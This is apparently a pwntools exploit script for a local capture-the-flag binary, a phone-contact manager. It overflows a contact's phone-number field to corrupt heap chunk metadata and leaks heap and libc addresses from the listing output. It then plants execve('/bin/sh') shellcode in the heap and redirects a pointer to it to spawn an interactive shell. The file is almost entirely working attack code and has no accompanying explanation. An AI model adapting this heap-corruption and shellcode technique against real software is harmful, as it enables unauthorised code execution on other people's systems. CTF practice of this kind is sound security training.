#!/usr/bin/env python
from pwn import *
p=process('./ctf')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def menu(i):
    ru('0. Exit\n')
    sl(str(i))

def new(name,number):
    menu(2)
    ru('Enter the name of the contact: ')
    sl(name)
    ru('Enter the phone number of the contact: ')
    sl(number)

def show():
    menu(1)

def edit(index,name,number):
    menu(3)
    ru('Enter the index of the entry: ')
    sl(str(index))
    ru('Enter the name of the contact: ')
    sl(name)
    ru('Enter the phone number of the contact: ')
    sl(number)


def delete(index):
    menu(4)
    ru('Enter the id of the entry to remove: ')
    sl(str(index))

def debugf(load=''):
    gdb.attach(p,load)
context.log_level='debug'
new('a','a')       # 1 1
new('b','b')       # 2  
new('c','c')       # 3 2      hiden
new('d','d')       # 4 3


edit(1,'a','a'*0x18+p64(0xa1))

# debugf()

delete(2)

new('b','b')         # 4
# new('c','c')         # 5
            
phone_number_payload='b'*0x10+'b'*0x50+'b'*0x8
edit(1,'a'*0x20,phone_number_payload)

show()
ru('id: [3]\n')
heap_line=ru(']\n')
libc_line=ru(']')

lidx=heap_line.index('[')
ridx=heap_line.index(']')
heap=u64(heap_line[lidx+1:ridx].ljust(8,'\x00'))
print(hex(heap))

lidx=libc_line.index('[')
ridx=libc_line.index(']')
libc=u64(libc_line[lidx+1:ridx].ljust(8,'\x00'))
print(hex(libc))
context.arch='amd64'
shellcode='xor eax,eax;mov al,59;mov rbx,0x9968732f6e69622f;shl rbx,8;shr rbx,8;push rbx;mov rdi,rsp;'
shellcode+='xor esi,esi;xor edx,edx;syscall'
mac=asm(shellcode)
edit(1,'a'*0x20,'b'*0x10+'b'*0x68+mac)

for i in range(len(mac)):
    if ord(mac[i])==0:
        print(hex(ord(mac[i])))

for i in range(7):
    edit(1,'a'*0x20,'b'*0x10+'b'*(0x67-i))
edit(1,'a'*0x20,'b'*0x10+'b'*0x60+p64(heap+0x18))

delete(2)

p.interactive()